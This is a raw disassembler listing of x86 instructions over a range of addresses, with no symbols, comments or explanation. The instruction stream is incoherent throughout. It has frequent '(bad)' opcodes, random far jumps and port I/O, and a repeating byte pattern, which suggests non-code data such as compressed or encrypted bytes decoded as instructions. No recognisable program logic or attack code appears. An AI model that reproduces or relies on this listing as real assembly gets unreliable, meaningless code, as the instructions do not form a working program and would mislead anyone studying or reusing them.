  420fdf:	sub    DWORD PTR [eax],ebp
  420fe1:	sar    esi,1
  420fe3:	or     ecx,esi
  420fe5:	and    ah,al
  420fe7:	cdq    
  420fe8:	shl    bh,0xe5
  420feb:	sub    DWORD PTR [edi-0x36],edx
  420fee:	mov    BYTE PTR [edi-0x1d],dl
  420ff1:	adc    eax,0xd4772a
  420ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ff7:	jl     0x420fbe
  420ff9:	adc    bl,al
  420ffb:	or     BYTE PTR ds:0xe8d6935e,dh
  421001:	push   ds
  421002:	add    esp,DWORD PTR [ebp+0x62]
  421005:	adc    bl,BYTE PTR [ecx+edi*4+0x5c2f11db]
  42100c:	add    DWORD PTR [edx+0x2e],ebp
  42100f:	inc    esi
  421010:	aas    
  421011:	cwde   
  421012:	ss sbb al,0x3e
  421015:	or     eax,0xb6a85df5
  42101a:	pop    eax
  42101b:	xchg   ecx,eax
  42101c:	mov    al,0xfa
  42101e:	rcr    BYTE PTR ss:[edi+0x14],1
  421022:	std    
  421023:	clc    
  421024:	mov    ebp,0x7f9b2916
  421029:	shl    al,1
  42102b:	out    dx,al
  42102c:	(bad)  
  42102e:	push   0xffffffff
  421030:	test   eax,0x5410e1c1
  421035:	cmp    BYTE PTR [edi+0x33],0x27
  421039:	das    
  42103a:	bound  esi,QWORD PTR [ebx]
  42103c:	or     edx,DWORD PTR [ecx+0x76]
  42103f:	inc    esi
  421040:	xlat   BYTE PTR ds:[ebx]
  421041:	and    ebx,DWORD PTR [edi-0x7a]
  421044:	push   eax
  421045:	ret    0xd65c
  421048:	aaa    
  421049:	xchg   esi,eax
  42104a:	dec    ecx
  42104b:	mov    al,0xf7
  42104d:	pop    esp
  42104e:	mov    eax,0xc7f8f8f7
  421053:	push   es
  421054:	jo     0x420ff4
  421056:	push   ecx
  421057:	adc    cl,ah
  421059:	hlt    
  42105a:	pop    edi
  42105c:	inc    ebp
  42105d:	je     0x42100b
  42105f:	std    
  421060:	out    0x8c,eax
  421062:	loopne 0x421034
  421064:	adc    DWORD PTR [esi-0x7e],edi
  421067:	(bad)  
  421069:	mov    ds:0x132d8b64,eax
  42106e:	lods   eax,DWORD PTR ds:[esi]
  42106f:	pop    es
  421070:	mov    DWORD PTR [eax-0x3e7dfdb],0x208f5f02
  42107a:	mov    dl,0x73
  42107c:	sub    edi,DWORD PTR [edx+0x471d83fa]
  421082:	lahf   
  421083:	mov    eax,0xae282a2f
  421088:	imul   edx,eax,0x55
  42108b:	scas   al,BYTE PTR es:[edi]
  42108c:	mov    ds:0xe65ac0,al
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    gs,WORD PTR [eax+0xceae332]
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	jge    0x42114b
  42110e:	add    al,0x3c
  421110:	arpl   bp,dx
  421112:	sub    edx,ecx
  421114:	and    DWORD PTR [esi-0x1244d6e0],0x4fcafa1a
  42111e:	stos   BYTE PTR es:[edi],al
  42111f:	aam    0x11
  421121:	inc    edx
  421122:	out    0xa0,eax
  421124:	imul   edx,DWORD PTR [edx+0x4ebc1abd],0x6f
  42112b:	push   ss
  42112c:	dec    edi
  42112d:	pop    ss
  42112e:	int3   
  42112f:	ss add edi,esi
  421132:	jecxz  0x42110b
  421134:	jecxz  0x4210c1
  421136:	out    dx,al
  421137:	nop
  421138:	neg    dh
  42113a:	cmp    eax,ebp
  42113c:	aam    0xfb
  42113e:	and    eax,0xf329e443
  421143:	rol    esp,cl
  421145:	mov    bh,0xa7
  421147:	fcomp  DWORD PTR [ebx-0x73]
  42114a:	pop    eax
  42114b:	hlt    
  42114c:	pop    esp
  42114d:	push   ecx
  42114e:	sub    ch,BYTE PTR [ebp+0x57]
  421151:	push   es
  421152:	push   edi
  421153:	dec    esp
  421154:	aaa    
  421155:	imul   ebx,DWORD PTR [ebx+0x18f98664],0x6126e30f
  42115f:	cdq    
  421160:	js     0x42117c
  421162:	xlat   BYTE PTR ds:[ebx]
  421163:	jmp    0x15a4:0xa7c00631
  42116a:	sbb    eax,0x233b0555
  42116f:	test   al,0x4c
  421171:	ror    WORD PTR [ebx-0x679ce5c7],0x26
  421179:	sar    BYTE PTR [ebp-0x4e],1
  42117c:	mov    edx,esi
  42117e:	int3   
  42117f:	aas    
  421180:	jb     0x4211aa
  421182:	xchg   ecx,eax
  421183:	retf   
  421184:	jbe    0x42113a
  421186:	sub    ah,BYTE PTR [ebp-0x1bee188a]
  42118c:	xor    BYTE PTR [eax],dl
  42118e:	stos   DWORD PTR es:[edi],eax
  42118f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421190:	sti    
  421191:	xchg   DWORD PTR [eax-0x6],ecx
  421194:	sub    dl,BYTE PTR [eax*4+0x7dcd2578]
  42119b:	adc    al,0x36
  42119d:	pop    edx
  42119e:	inc    ecx
  42119f:	add    bh,ch
  4211a1:	mov    edx,0xd8b46a9a
  4211a6:	dec    ebx
  4211a7:	xchg   ebp,eax
  4211a8:	cmp    eax,ebp
  4211aa:	push   edi
  4211ab:	imul   edx,DWORD PTR ds:0x92692fac,0x609e7232
  4211b5:	fld    DWORD PTR ds:0xfb333a49
  4211bb:	xchg   eax,esp
  4211bd:	sti    
  4211be:	xchg   ecx,eax
  4211bf:	ins    BYTE PTR es:[edi],dx
  4211c0:	xor    al,0xa0
  4211c2:	adc    eax,0xf69fb29b
  4211c7:	mov    dh,0xb4
  4211c9:	inc    ecx
  4211ca:	(bad)  
  4211cb:	cmp    eax,0x8fa482fd
  4211d0:	adc    BYTE PTR ds:0x1a451936,al
  4211d6:	gs or  al,0xcc
  4211d9:	inc    esi
  4211da:	es xor al,0xcf
  4211dd:	inc    edi
  4211de:	test   eax,0x86db8aea
  4211e3:	or     eax,0x91203b53
  4211e8:	pop    edx
  4211e9:	clc    
  4211ea:	mov    BYTE PTR [ebx-0x54dc1e02],ah
  4211f0:	iret   
  4211f1:	pop    ecx
  4211f2:	fisttp WORD PTR [ebx]
  4211f4:	xchg   ebx,eax
  4211f5:	push   ds
  4211f6:	jbe    0x421207
  4211f8:	mov    dh,0x74
  4211fa:	loopne 0x421184
  4211fc:	js     0x4211ee
  4211fe:	push   ecx
  4211ff:	fs hlt 
  421201:	cmp    DWORD PTR [esi-0x6d],esp
  421204:	and    dl,BYTE PTR [esi-0x51dd3ed5]
  42120a:	pop    ds
  42120b:	and    bh,BYTE PTR [edi]
  42120d:	(bad)  
  42120e:	sti    
  42120f:	inc    BYTE PTR [eax]
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0xa4bb7ab3
  421282:	jle    0x421276
  421284:	adc    BYTE PTR [ecx+0x1],ah
  421287:	add    BYTE PTR [ecx+eax*1],al
  42128a:	add    BYTE PTR [eax],al
  42128c:	es jmp 0x4212c1
  42128f:	int    0x34
  421291:	fiadd  WORD PTR [edx+0x7e]
  421294:	jg     0x421256
  421296:	ins    BYTE PTR es:[edi],dx
  421297:	ds (bad) 
  421299:	daa    
  42129a:	dec    eax
  42129b:	jmp    0xa85e:0x12a2f3c7
  4212a2:	mov    es,edx
  4212a4:	pop    edx
  4212a5:	out    0x2c,al
  4212a7:	js     0x421327
  4212a9:	lea    ecx,[eax+0x611693bb]
  4212af:	cli    
  4212b0:	pop    esi
  4212b1:	scas   al,BYTE PTR es:[edi]
  4212b2:	cli    
  4212b3:	sbb    DWORD PTR [ecx+ecx*2-0x2624082c],0x72
  4212bb:	xchg   esp,eax
  4212bc:	shr    dl,cl
  4212be:	pop    ebx
  4212bf:	repnz and DWORD PTR [edx+0x5a812a3f],ebp
  4212c6:	jne    0x42131b
  4212c8:	jge    0x421258
  4212ca:	and    DWORD PTR [esi+eax*2],edx
  4212cd:	imul   eax,DWORD PTR [edx],0xa6214420
  4212d3:	mov    es,edi
  4212d5:	sub    DWORD PTR [edi],edi
  4212d7:	test   BYTE PTR [ebx-0x46ec48ed],0x14
  4212de:	bound  esi,QWORD PTR [esi-0x65]
  4212e1:	inc    esp
  4212e2:	xchg   DWORD PTR [eax-0x3d2c80a6],ebx
  4212e8:	xor    cl,BYTE PTR [ebx-0x6d1c29d]
  4212ee:	dec    edi
  4212ef:	sbb    eax,0x27b546cf
  4212f4:	mov    ebp,DWORD PTR [edx]
  4212f6:	lds    ecx,FWORD PTR [ebx+0x15]
  4212f9:	call   0x94b0:0x5f2ad878
  421300:	dec    esi
  421301:	fs and esi,ebp
  421304:	push   ebp
  421305:	xor    eax,0xbfdbd494
  42130a:	sbb    esp,esp
  42130c:	and    ebp,0xffffffbd
  42130f:	das    
  421310:	loop   0x421342
  421312:	add    BYTE PTR [edi+ebx*8],al
  421315:	adc    DWORD PTR [ebx+edi*8+0x18],edi
  421319:	add    cl,BYTE PTR [ecx]
  42131b:	repnz test eax,0xf9ca6fd6
  421321:	jmp    0x65876e8a
  421326:	mov    ecx,gs
  421328:	aam    0xf6
  42132a:	hlt    
  42132b:	jmp    DWORD PTR [eax+eiz*8+0x50]
  42132f:	loopne 0x42139f
  421331:	jp     0x4212f1
  421333:	ret    
  421334:	std    
  421335:	addr16 (bad) 
  421338:	push   esp
  421339:	sbb    BYTE PTR [eax+0x19],cl
  42133c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42133d:	adc    al,0x60
  42133f:	sbb    al,0x84
  421341:	cs mov esp,0xa1b8b65
  421347:	adc    eax,0x90c17bfc
  42134c:	pop    ebx
  42134d:	cld    
  42134e:	inc    ecx
  42134f:	xchg   ebp,eax
  421350:	rol    BYTE PTR [eax+0x74],1
  421353:	in     eax,0x9e
  421355:	jle    0x42133c
  421357:	jl     0x421300
  421359:	ss stc 
  42135b:	xchg   esp,eax
  42135c:	cmc    
  42135d:	push   es
  42135e:	sbb    al,0x56
  421360:	fs pop esp
  421362:	pop    ecx
  421363:	ins    BYTE PTR es:[edi],dx
  421364:	iret   
  421365:	push   es
  421366:	jns    0x421330
  421368:	xlat   BYTE PTR ds:[ebx]
  421369:	xchg   ebx,eax
  42136a:	jle    0x42132f
  42136c:	cmp    eax,esp
  42136e:	mov    bl,bh
  421370:	xchg   ecx,eax
  421371:	fwait
  421372:	jne    0x4213da
  421374:	dec    esp
  421375:	sbb    edx,esp
  421377:	cdq    
  421378:	cld    
  421379:	mov    al,ds:0x54bf6588
  42137e:	fisttp WORD PTR [ecx+0x8]
  421381:	mov    bh,bh
  421383:	xor    edx,ebp
  421385:	test   BYTE PTR [ebp+ecx*2-0x6eaa0f17],dh
  42138c:	and    ebx,DWORD PTR [eax+0xe809]
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x53f30b61]
  421402:	xchg   esp,eax
  421403:	sbb    edx,DWORD PTR [edx+eiz*2]
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	mov    ecx,0x3cf61247
  421411:	mov    al,0x95
  421413:	rcl    BYTE PTR [esi],cl
  421415:	mov    eax,0xe23bd1ab
  42141a:	pushf  
  42141b:	shl    dh,0x8f
  42141e:	mov    esi,0x3827e540
  421423:	pop    edi
  421424:	xchg   ebx,eax
  421425:	mov    bl,BYTE PTR [ecx]
  421427:	out    0x28,eax
  421429:	xchg   edi,eax
  42142a:	retf   
  42142b:	shr    BYTE PTR ds:0x3c347fd0,0x65
  421432:	addr16 jnp 0x421491
  421435:	sbb    bl,bh
  421437:	not    DWORD PTR [ebx+0x5624a178]
  42143d:	push   cs
  42143e:	jbe    0x42144f
  421440:	dec    ebx
  421441:	fnsave [ebp-0x1a34d5a2]
  421447:	leave  
  421448:	retf   
  421449:	out    0x4e,al
  42144b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42144c:	cmp    al,0x79
  42144e:	sub    ah,dh
  421450:	xor    al,0xe4
  421452:	sbb    dh,0x32
  421455:	pop    es
  421456:	js     0x421436
  421458:	daa    
  421459:	adc    eax,0xfb5f52df
  42145e:	mov    DWORD PTR [edi+0x6b2f9b80],esp
  421464:	cmp    al,0x48
  421466:	add    BYTE PTR [ecx-0x61c9de94],bl
  42146c:	addr16 es iret 
  42146f:	pop    ss
  421470:	rcr    esp,1
  421472:	test   eax,0xef789481
  421477:	inc    esi
  421478:	xchg   esi,eax
  421479:	adc    eax,0x32229b71
  42147e:	cmc    
  42147f:	sub    dl,dh
  421481:	jl     0x421456
  421483:	mov    ecx,es
  421485:	dec    edx
  421486:	outs   dx,DWORD PTR ds:[esi]
  421487:	mov    eax,ds:0x4a6d6f8d
  42148c:	int3   
  42148d:	or     al,ch
  42148f:	xor    BYTE PTR [ebp+0x9],bh
  421492:	ins    BYTE PTR es:[edi],dx
  421493:	js     0x421429
  421495:	pop    ecx
  421496:	cs sbb ecx,esi
  421499:	lea    edx,[edx]
  42149b:	jl     0x4214d4
  42149d:	sti    
  42149e:	(bad)  
  4214a0:	inc    edx
  4214a1:	or     BYTE PTR [esp+ecx*4+0x3fbd735a],0xca
  4214a9:	jnp    0x4214b2
  4214ab:	fcomp  QWORD PTR [ebx-0x80]
  4214ae:	cmp    eax,0xfc9b69e
  4214b3:	(bad)  
  4214b4:	loope  0x421491
  4214b6:	adc    dl,BYTE PTR [ecx+0x8027a43]
  4214bc:	sbb    BYTE PTR [eax],dl
  4214be:	fwait
  4214bf:	mov    edx,0x48390f5a
  4214c4:	repz shl DWORD PTR [eax-0x78bac13c],1
  4214cb:	cmp    al,dh
  4214cd:	or     DWORD PTR [edx-0x80],0x75e79cf2
  4214d4:	push   eax
  4214d5:	pop    edi
  4214d6:	mov    ds:0x1bacea18,eax
  4214db:	cmp    DWORD PTR [eax],eax
  4214dd:	sub    bl,0x48
  4214e0:	fwait
  4214e1:	std    
  4214e2:	push   esi
  4214e3:	push   eax
  4214e4:	and    eax,0x3052b9a
  4214e9:	jmp    0x620c43be
  4214ee:	pop    eax
  4214ef:	sub    eax,0x40633235
  4214f4:	jecxz  0x421495
  4214f6:	push   esp
  4214f7:	lock cmc 
  4214f9:	ret    
  4214fa:	push   ebx
  4214fb:	xor    eax,0xc39ad2
  421500:	or     eax,0xd3c74392
  421505:	(bad)  
  421506:	dec    edx
  421507:	(bad)  
  421508:	mov    DWORD PTR [edx-0x7807872],0x4380
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x518f42b4],bp
  421582:	ss dec ecx
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	xchg   edx,eax
  42158d:	pop    ds
  42158e:	in     al,dx
  42158f:	and    DWORD PTR [ebx-0x349b5aa],ebp
  421595:	cli    
  421596:	jle    0x42155e
  421598:	xor    bl,bh
  42159a:	data16 test BYTE PTR [edx-0x50abdf64],0x60
  4215a2:	lahf   
  4215a3:	fild   DWORD PTR [edi+0x58ccac74]
  4215a9:	pop    esp
  4215aa:	ret    
  4215ab:	mov    edx,0x2159573d
  4215b0:	loop   0x4215bb
  4215b2:	mul    DWORD PTR [edi-0x55dd469b]
  4215b8:	jo     0x4215e7
  4215ba:	push   0x7b378ecd
  4215bf:	(bad)  
  4215c0:	out    0x37,eax
  4215c2:	push   ecx
  4215c3:	les    ecx,FWORD PTR [esi-0x6fc92e86]
  4215c9:	out    0x98,eax
  4215cb:	adc    DWORD PTR [eax-0x1d92e675],ecx
  4215d1:	xchg   ebp,eax
  4215d2:	mov    ds:0x89f496b8,al
  4215d7:	fnstsw WORD PTR [ebx-0xe98a895]
  4215dd:	dec    esi
  4215de:	or     DWORD PTR ds:0x4a89014e,0xffffff91
  4215e5:	test   eax,0x3ee3eddf
  4215ea:	imul   eax,DWORD PTR [esp+esi*1+0x3f058b00],0xffffffef
  4215f2:	leave  
  4215f3:	sbb    al,BYTE PTR [ebx]
  4215f5:	pop    esi
  4215f6:	retf   0xade0
  4215f9:	inc    esi
  4215fa:	mov    edx,?
  4215fc:	std    
  4215fd:	mov    al,ds:0x164ad4f6
  421602:	xor    al,0x1
  421604:	rcr    ebx,cl
  421606:	(bad)  
  421607:	mov    esi,0x1dcb74c
  42160c:	aas    
  42160d:	xor    eax,DWORD PTR [esi+0x27]
  421610:	ins    BYTE PTR es:[edi],dx
  421611:	(bad)  [ebp+0x1d]
  421614:	adc    al,0xa2
  421616:	dec    ebx
  421617:	mov    esp,0xda3197e5
  42161c:	js     0x421614
  42161e:	retf   0xbed0
  421621:	jmp    0x59006348
  421626:	dec    edx
  421627:	mov    eax,ds:0xd611b35e
  42162c:	add    DWORD PTR [ecx+0x60],0xffffffe3
  421630:	mov    esp,0xc57b5bee
  421635:	adc    cl,BYTE PTR [eax+esi*4+0x3a]
  421639:	jbe    0x42160f
  42163b:	add    DWORD PTR [edx],ecx
  42163d:	(bad)  
  42163e:	aas    
  42163f:	mov    al,ds:0x2536afaa
  421644:	mov    ecx,0x60069d17
  421649:	sbb    esp,DWORD PTR [esi-0x19]
  42164c:	cmp    dh,BYTE PTR [edi]
  42164e:	jo     0x42162b
  421650:	cmp    eax,0xd9e55bb0
  421655:	adc    al,0xc2
  421657:	(bad)  
  421658:	mov    dh,0x7b
  42165a:	sbb    DWORD PTR [eax+0x8a3d926],ebx
  421660:	sub    BYTE PTR [ebx+0x1eaa6e49],0x1b
  421667:	sar    DWORD PTR [ebx-0x11],1
  42166a:	daa    
  42166b:	dec    ebx
  42166c:	sub    edi,ebp
  42166e:	xchg   esi,eax
  42166f:	test   ch,0xff
  421672:	mov    bh,0x95
  421674:	cwde   
  421675:	test   DWORD PTR [ebx],esi
  421677:	sbb    eax,DWORD PTR es:[ebp+0x7f44df18]
  42167e:	mov    eax,0xb66ff247
  421683:	push   ds
  421684:	push   ecx
  421685:	or     eax,0x736e7147
  42168a:	mov    ch,0xdc
  42168c:	arpl   WORD PTR [esi+0xa1af],di
	...
  4216f2:	add    BYTE PTR [eax],al
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	or     eax,0x1c6da2c7
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	cmp    dl,BYTE PTR [eax+eax*2+0x3bbfb35c]
  421713:	adc    eax,0xbcd085e8
  421718:	in     eax,0xc9
  42171a:	or     ch,BYTE PTR [edi-0x4b]
  42171d:	test   eax,0x2b9dbefa
  421722:	cld    
  421723:	xchg   ebx,eax
  421724:	mov    ds:0xe0018ea9,al
  421729:	jnp    0x421717
  42172b:	xchg   ecx,eax
  42172c:	mov    WORD PTR [eax],?
  42172e:	arpl   WORD PTR [ebx+edx*8],bp
  421731:	scas   al,BYTE PTR es:[edi]
  421732:	mov    esi,0x4ef6918e
  421737:	stc    
  421738:	stos   DWORD PTR es:[edi],eax
  421739:	daa    
  42173a:	dec    esi
  42173b:	cld    
  42173c:	aad    0x24
  42173e:	inc    edx
  42173f:	loop   0x4217b2
  421741:	mov    bh,BYTE PTR [ecx]
  421743:	lods   eax,DWORD PTR ds:[esi]
  421744:	ins    DWORD PTR es:[edi],dx
  421745:	(bad)  
  421746:	rol    DWORD PTR [ecx],1
  421748:	fwait
  421749:	jecxz  0x4216db
  42174b:	aad    0x3a
  42174d:	or     dh,BYTE PTR ds:0xdcbbe2e2
  421753:	add    BYTE PTR [ecx-0x7d0ae526],cl
  421759:	xor    DWORD PTR [eax-0x5c],ebp
  42175c:	cmc    
  42175d:	or     DWORD PTR [ecx-0x6f5c1833],esp
  421763:	push   ss
  421764:	out    0x4a,al
  421766:	stos   DWORD PTR es:[edi],eax
  421767:	ret    
  421768:	xor    DWORD PTR [edi+0x22],ebp
  42176b:	dec    ecx
  42176c:	mov    esp,0x3eef6f5b
  421771:	sub    ah,cl
  421773:	pop    ecx
  421774:	test   al,0x24
  421776:	jl     0x4217bf
  421778:	(bad)  
  421779:	ins    BYTE PTR es:[edi],dx
  42177a:	inc    esp
  42177b:	xchg   edi,eax
  42177c:	imul   ebx,DWORD PTR [eax+0x5b672c90],0x363a04b6
  421786:	test   BYTE PTR [eax-0x167835f3],ah
  42178c:	div    DWORD PTR [edi]
  42178e:	push   esi
  42178f:	aas    
  421790:	mov    esi,DWORD PTR [esp+edi*2+0x81f48af]
  421797:	fsubr  QWORD PTR [edx]
  421799:	cmp    BYTE PTR [esi+ecx*8-0x5a4ed488],0x40
  4217a1:	and    BYTE PTR [ecx+0xf],ch
  4217a4:	jg     0x421727
  4217a6:	jecxz  0x4217d0
  4217a8:	ror    DWORD PTR [ebx+0x27d02a30],1
  4217ae:	and    DWORD PTR [ecx-0x6319b3a8],ebp
  4217b4:	mov    WORD PTR [edi+0x431624a7],?
  4217ba:	ins    BYTE PTR es:[edi],dx
  4217bb:	sub    dh,ah
  4217bd:	sahf   
  4217be:	nop
  4217bf:	xchg   edi,eax
  4217c1:	shrd   DWORD PTR [esi+0x75],esi,0x4e
  4217c6:	aad    0xd3
  4217c8:	cmp    eax,eax
  4217ca:	xchg   ebp,eax
  4217cb:	jmp    0x4217a5
  4217cd:	push   ebp
  4217ce:	inc    edi
  4217cf:	inc    ebp
  4217d0:	sub    edi,DWORD PTR [ebx+0x59]
  4217d3:	jle    0x4217ba
  4217d5:	sbb    ah,BYTE PTR [ecx+0x7bf2fe43]
  4217db:	retf   
  4217dc:	(bad)  
  4217dd:	outs   dx,DWORD PTR ds:[esi]
  4217de:	scas   eax,DWORD PTR es:[edi]
  4217df:	or     eax,0x603a8013
  4217e4:	(bad)  
  4217e5:	aam    0x63
  4217e7:	(bad)  
  4217e8:	std    
  4217e9:	daa    
  4217ea:	push   0xfa01a54d
  4217ef:	jb     0x42182e
  4217f1:	cs jge 0x4217b9
  4217f4:	and    edx,DWORD PTR [ebp+0x75ddf895]
  4217fa:	mov    bh,0x20
  4217fc:	in     eax,dx
  4217fd:	pop    edi
  4217fe:	in     eax,0x55
  421800:	xchg   ebx,eax
  421801:	dec    ecx
  421802:	hlt    
  421803:	loope  0x42180c
  421805:	add    al,0x5f
  421807:	inc    edi
  421808:	outs   dx,BYTE PTR ds:[esi]
  421809:	sbb    ch,bh
  42180b:	repz sub BYTE PTR cs:[esi+0x63],bh
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	mov    ebx,0x20941334
  421885:	add    DWORD PTR gs:[eax],eax
  421888:	add    al,0x1
  42188a:	add    BYTE PTR [eax],al
  42188c:	sub    DWORD PTR [ebx],0xffffffaf
  42188f:	sbb    ch,ah
  421891:	lds    esp,FWORD PTR [ebx]
  421893:	shl    BYTE PTR [ebp-0x21],1
  421896:	add    al,bl
  421898:	sub    BYTE PTR [esi-0x7c0c19be],dl
  42189e:	jns    0x4218c7
  4218a0:	shl    dh,cl
  4218a2:	lods   eax,DWORD PTR ds:[esi]
  4218a3:	in     eax,0x6d
  4218a5:	jmp    0xc7c3:0x5e5da29e
  4218ac:	push   ebx
  4218ad:	pop    esi
  4218ae:	jns    0x4218cb
  4218b0:	mov    al,ds:0xd13979bb
  4218b5:	call   0x7e821a0b
  4218ba:	add    BYTE PTR [esi-0x75cd198d],bh
  4218c0:	cmp    ch,BYTE PTR [eax-0x15]
  4218c3:	jl     0x42191c
  4218c5:	jge    0x42186e
  4218c7:	arpl   WORD PTR [edx+0x32],si
  4218ca:	jae    0x4218b4
  4218cc:	into   
  4218cd:	sbb    ah,BYTE PTR [ebp-0x4d58f28f]
  4218d3:	sub    al,0x39
  4218d5:	cdq    
  4218d6:	jmp    0x39913808
  4218db:	mov    esi,0x8f1fdfc9
  4218e0:	ins    BYTE PTR es:[edi],dx
  4218e1:	mov    ebp,0xdde4f41a
  4218e6:	daa    
  4218e7:	pop    esi
  4218e8:	xchg   edx,eax
  4218e9:	sahf   
  4218ea:	out    dx,eax
  4218eb:	(bad)  [ecx-0x4871e7af]
  4218f1:	cmp    eax,0x904786e7
  4218f6:	test   al,0x59
  4218f8:	mov    ecx,0xcf95c255
  4218fd:	and    bh,dh
  4218ff:	fstp   TBYTE PTR [eax]
  421901:	xchg   edi,eax
  421902:	lock aad 0x1c
  421905:	call   0x3e9c2a29
  42190a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42190b:	bound  edi,QWORD PTR [esi+0x581037b5]
  421911:	add    al,0xa0
  421913:	xchg   edx,eax
  421914:	add    BYTE PTR [esi],bh
  421916:	pop    edx
  421917:	pop    ecx
  421918:	jg     0x4218d3
  42191a:	das    
  42191b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42191c:	int    0x3b
  42191e:	sbb    ebx,DWORD PTR [edx]
  421920:	imul   edx,DWORD PTR [edi-0x3cb73f58],0x10
  421927:	adc    edi,0xfffffff3
  42192a:	cs popf 
  42192c:	lahf   
  42192d:	pop    eax
  42192e:	and    DWORD PTR [edx+0x39],eax
  421931:	cmp    eax,ecx
  421933:	jmp    0x4218d4
  421935:	jne    0x42197c
  421937:	fcmovnu st,st(2)
  421939:	repz push edx
  42193b:	dec    eax
  42193c:	xor    eax,0x1d97df9a
  421941:	jmp    0xea5e4597
  421946:	lods   al,BYTE PTR ds:[esi]
  421947:	ja     0x4218fc
  421949:	fiadd  WORD PTR [edx-0x7a058b6c]
  42194f:	xchg   ebx,eax
  421950:	ins    DWORD PTR es:[edi],dx
  421951:	jl     0x421960
  421953:	ins    DWORD PTR es:[edi],dx
  421954:	mov    ebp,0xd301ae72
  421959:	test   DWORD PTR [ecx],0x3091e0db
  42195f:	ds xchg ecx,eax
  421961:	cli    
  421962:	add    eax,0x847ee5ba
  421967:	ds and eax,0x2d67e65
  42196d:	jb     0x421906
  42196f:	idiv   DWORD PTR [eax+0x65095172]
  421975:	push   ecx
  421976:	xchg   esi,eax
  421977:	inc    eax
  421978:	div    ebx
  42197a:	ret    0xa8b5
  42197d:	aam    0x8
  42197f:	push   ebx
  421980:	in     al,dx
  421981:	in     al,0x28
  421983:	test   eax,0xe327d134
  421988:	stos   DWORD PTR es:[edi],eax
  421989:	mov    ah,BYTE PTR [edi+0x30]
  42198c:	or     BYTE PTR [eax],dl
  42198e:	push   ss
  42198f:	enter  0x0,0x0
	...
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	mov    WORD PTR [edx+edi*1],ss
  421a03:	cmp    ah,BYTE PTR [esi+eiz*2]
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	jmp    0x389:0x24626b6a
  421a13:	mov    esp,0x2f302c81
  421a18:	loope  0x4219ce
  421a1a:	ins    BYTE PTR es:[edi],dx
  421a1b:	imul   ebp,ebp,0x7b
  421a1e:	(bad)  
  421a1f:	mov    ds:0x97f3b406,eax
  421a24:	inc    esp
  421a25:	pop    edx
  421a26:	lock sbb al,0xc0
  421a29:	cmp    DWORD PTR [eax],0xd16862ac
  421a2f:	lds    ebp,FWORD PTR [ebx-0x404abd7f]
  421a35:	pushf  
  421a36:	(bad)  
  421a37:	cmp    DWORD PTR [edx],esi
  421a39:	aas    
  421a3a:	pop    ss
  421a3b:	sahf   
  421a3c:	mov    ebx,0x7bd007c
  421a41:	push   ebp
  421a42:	dec    ebx
  421a43:	hlt    
  421a44:	xor    eax,0xcddfd887
  421a49:	jb     0x421aae
  421a4b:	add    bh,BYTE PTR [esi+0x45]
  421a4e:	sar    dh,1
  421a50:	dec    esi
  421a51:	mov    cl,0xf1
  421a53:	inc    ebp
  421a54:	adc    eax,DWORD PTR [ecx]
  421a56:	push   ds
  421a57:	loopne 0x421ab9
  421a59:	in     al,0x6d
  421a5b:	mov    ecx,0x1ac79c71
  421a60:	pop    ecx
  421a61:	int3   
  421a62:	rol    DWORD PTR [ebx+0x72a037fa],0xe1
  421a69:	lds    ecx,FWORD PTR [ebx-0x20]
  421a6c:	neg    BYTE PTR [ebx-0x7f1967ea]
  421a72:	cmp    cl,ch
  421a74:	push   0xcd033468
  421a79:	out    dx,al
  421a7a:	mov    ebp,DWORD PTR [edx+0x1d]
  421a7d:	sahf   
  421a7e:	imul   edi,esi,0xfffffff0
  421a81:	mov    ecx,0xb4a7070e
  421a86:	gs dec esp
  421a88:	and    BYTE PTR ds:0xf9a6f778,cl
  421a8e:	(bad)  
  421a8f:	jp     0x421aa3
  421a91:	and    al,0xe9
  421a93:	jp     0x421a76
  421a95:	ss push esp
  421a97:	fs xchg bh,dl
  421a9a:	or     DWORD PTR [eax],ecx
  421a9c:	dec    esp
  421a9d:	out    dx,eax
  421a9e:	je     0x421b17
  421aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
